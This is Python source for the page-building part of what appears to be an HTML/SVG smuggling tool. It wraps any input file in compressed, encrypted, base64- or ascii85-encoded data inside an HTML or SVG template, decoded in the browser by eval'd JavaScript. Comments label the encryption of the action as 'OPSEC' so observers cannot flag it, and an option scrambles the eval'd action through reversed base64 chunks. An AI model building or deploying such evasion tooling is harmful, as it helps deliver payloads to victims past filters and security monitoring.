import base64
import gzip
import os
import sys
from typing import Optional
# local
from .minified_js import B64DECODE, B85DECODE, UNZIP
from .static_js import HEXDUMP, DECODE_AND_EVAL_ACTION
from .crypto import BaseEncryptor, NullEncryptor, ALGORITHM_NULL
from .util import print_info

SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
DEFAULT_SVG_FILE = os.path.join(SCRIPT_DIR, "default.svg")
DEFAULT_TEMPLATE_FILE = os.path.join(SCRIPT_DIR, "template.html")


class PageBuilder:
    def __init__(self, input_file: str, template: str, js_payload: str, encryption_password: Optional[str], password_hint: str, obscure_action: bool) -> None:
        self.template = template
        self.obscure_action = obscure_action

        try:
            if input_file == "-":
                # Read the buffer to get data as binary
                self.input_data = sys.stdin.buffer.read()
            else:
                with open(input_file, "rb") as f:
                    self.input_data = f.read()
        except:
            raise Exception(f"Failed to load input file '{input_file}'")

        self.js_payload = js_payload
        # Nonce reuse should be save, since only one of the results should be used (we may need to encrypt multiple time if some parameters have the `auto` value)
        if encryption_password:
            try:
                # Conditional import, since it is not always needed and loads an external library
                from .crypto_aes import AesEncryptor
                self.encryptor = AesEncryptor(encryption_password.encode(), password_hint)
            except Exception as ex:
                print("[-]", ex)
                print("[*] Hint: Please make sure, that 'pycryptodomex' is installed. You can install it by running:")
                print("python3 -m pip install pycryptodomex")
                raise ex
        else:
            self.encryptor = NullEncryptor()

    def build_page(self, compression: str, encoding: str, insert_debug_statements: bool) -> str:
        compression_list = ["none", "gzip"] if compression == "auto" else [compression]
        encoding_list = ["base64", "ascii85"] if encoding == "auto" else [encoding]
        variants = []

        for c in compression_list:
            for e in encoding_list:
                page = self.build_page_no_auto(c, e, insert_debug_statements)
                print_info(f"Testing combination: {c} & {e} => {len(page)} bytes")
                variants.append(page)

        # Return the shortest result
        return sorted(variants, key=lambda x: len(x))[0]

    def build_page_no_auto(self, compression: str, encoding: str, insert_debug_statements: bool) -> str:
        library_code = self.encryptor.get_js_library_code()
        encoded_data = self.input_data
        js_payload_action = self.js_payload

        if self.encryptor.get_algorithm() != ALGORITHM_NULL:
            # OPSEC: Also encrypt the action, so that an observer can not see/flag what we want to do
            # We hack this into the existing schema by encrypting <PAYLOAD_ACTION_JS_TO_EVAL>\x00<ORIGINAL_DATA>.
            # Since encryption is done after compression, we should also compress our data (otherwise the handling gets hard)
            encoded_data = js_payload_action.encode() + b"\x00" + encoded_data
            # Then we modify our action to extract the code to execute and the original data.
            # This is much easier than modifying the existing encryption code to reuse the password, key, etc and perform separate decryptions for the payload and the action
            js_payload_action = "idx=og_data.indexOf(0);code=new TextDecoder().decode(og_data.slice(0,idx));og_data=og_data.slice(idx+1);eval(code);"

        if self.obscure_action:
            # takes a string, base64 encodes it, splits it into chunks of 5 characters, reverses their order and joins them with a -
            encoded_action = base64.b64encode(js_payload_action.encode()).decode()
            obscured_action = ('-'.join([b[::-1] for b in [encoded_action[i: i+5] for i in range(0, len(encoded_action), 5)]]))
            js_payload_action = DECODE_AND_EVAL_ACTION.replace("{{OBSCURED_ACTION}}", obscured_action)

        if compression == "gzip":
            library_code += UNZIP
            encoded_data = gzip.compress(encoded_data)
        elif compression == "none":
            pass
        else:
            raise Exception(f"Unknown compression method '{compression}'")

        encoded_data = self.encryptor.encrypt_with_reused_iv(encoded_data)

        if encoding == "ascii85":
            library_code += B85DECODE
            decode_fn = "decode"
            encoded_data = base64.a85encode(encoded_data, adobe=True).replace(b'"', b"v").replace(b"\\", b"w")
        elif encoding == "base64":
            library_code += B64DECODE
            decode_fn = "await decodeAsync"
            encoded_data = base64.b64encode(encoded_data)
        else:
            raise Exception(f"Unknown encoding method '{compression}'")

        if insert_debug_statements:
            library_code += HEXDUMP
        
        glue_code = self.generate_glue_code(insert_debug_statements, decode_fn, compression)

        #@TODO only in SVG
        library_code_as_base64 = base64.b64encode(library_code.encode()).decode()
        library_code = f"eval(atob('{library_code_as_base64}'))"

        return self.replace_in_template(library_code, glue_code, js_payload_action, encoded_data)

    def generate_glue_code(self, insert_debug_statements: bool, decode_fn: str, compression: str) -> str:
        """
        Generates glue code that will take input `data` and then decrypts it (optional), unzips it (optional), decodes it (required) and finally passes it to the `action` function.
        """
        if insert_debug_statements:
            glue_decrypt = ""
            if self.encryptor.get_algorithm() != ALGORITHM_NULL:
                glue_decrypt += "data=await decryptLoop(data);log_hexdump('Decrypted',data);"
            if compression == "gzip":
                glue_decrypt += "data=unzip(data);log_hexdump('Unzipped',data);"

            return f"""async function main(data) {{
    log_hexdump('Encoded',data);
    data={decode_fn}(data);log_hexdump('Decoded',data);
    {glue_decrypt}
    action(data);
}}main(c_data);""".replace("\n", "").replace("\r", "").replace("    ", "")
        else:
            # We start with the input argument and then wrap it in more and more method calls
            glue_code = "data"
            glue_code = f"{decode_fn}({glue_code})"
            if self.encryptor.get_algorithm() != ALGORITHM_NULL:
                glue_code = f"await decryptLoop({glue_code})"
            if compression == "gzip":
                glue_code = f"unzip({glue_code})"

            glue_code = f"action({glue_code})"
            glue_code = "async function main(data){" + glue_code + "};main(c_data);"
            return glue_code


    def replace_in_template(self, library_code: str, glue_code: str, payload_code: str, encoded_data: bytes) -> str:
        return (self.template
                .replace("{{LIBRARY_CODE}}", library_code)
                .replace("{{GLUE_CODE}}", glue_code)
                .replace("{{PAYLOAD_CODE}}", payload_code)
                .replace("{{DATA}}", encoded_data.decode())
        )
